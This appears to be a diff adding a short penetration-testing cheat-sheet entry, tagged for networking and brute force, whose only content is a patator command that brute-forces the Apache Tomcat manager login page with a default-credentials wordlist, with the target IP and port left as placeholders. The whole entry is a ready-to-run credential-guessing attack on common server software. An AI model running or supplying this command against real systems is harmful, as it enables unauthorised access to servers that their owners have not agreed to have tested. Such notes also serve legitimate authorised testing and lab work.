@@ -1,0 +1,7 @@
+---
+syntax: bash
+tags: [ networking, brute ]
+---
+# brute force tomcat
+patator http_fuzz url=http://<IP>:<PORT>/manager/html user_pass=COMBO00:COMBO01 0=/usr/share/wordlists/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -x ignore:code=401
+
